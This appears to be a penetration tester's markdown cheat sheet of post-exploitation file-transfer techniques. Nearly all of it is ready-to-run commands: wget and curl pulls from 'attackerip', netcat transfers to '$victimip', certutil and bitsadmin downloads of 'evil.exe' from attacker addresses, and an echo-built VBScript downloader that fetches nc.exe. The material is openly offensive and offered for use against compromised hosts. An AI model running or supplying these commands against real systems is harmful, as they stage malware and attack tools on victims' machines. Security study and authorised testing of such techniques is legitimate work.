## Powershell
**Caderno**
## Setup HTTP Server

	python -m SimpleHTTPServer 80
	python3 -m http.server

## Linux download command
	wget http://attackerip/file

	curl http://attackerip/file > file

## netcat
Set up your victim to listen for the incoming request

	nc -nvlp 55555 > file

Send the file

	nc $victimip 55555 < file

## SCP
Copy a file

	scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext

Copy dir

	scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination


## Certutil

	certutil.exe -urlcache -split -f http://192.168.189.131:7777/evil.exe evil.exe

## Bitsadmin

	bitsadmin /transfer evil /download /priority high http://192.168.189.131:9995/evil.exe %temp%\evil.exe

## Findstr

	findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe

## VBScript
	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
	
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
	
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
	
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
	
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
	
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
	
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
	
	echo Err.Clear >> wget.vbs
	
	echo Set http = Nothing >> wget.vbs
	
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
	
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
	
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
	
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
	
	echo http.Open "GET", strURL, False >> wget.vbs
	
	echo http.Send >> wget.vbs
	
	echo varByteArray = http.ResponseBody >> wget.vbs
	
	echo Set http = Nothing >> wget.vbs
	
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
	
	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
	
	echo strData = "" >> wget.vbs
	
	echo strBuffer = "" >> wget.vbs
	
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
	
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
	
	echo Next >> wget.vbs
	
	echo ts.Close >> wget.vbs
	
After that run this command

	cscript /nologo wget.vbs http://10.10.14.x/nc.exe nc.exe

## A few more methods

Refer this: [https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)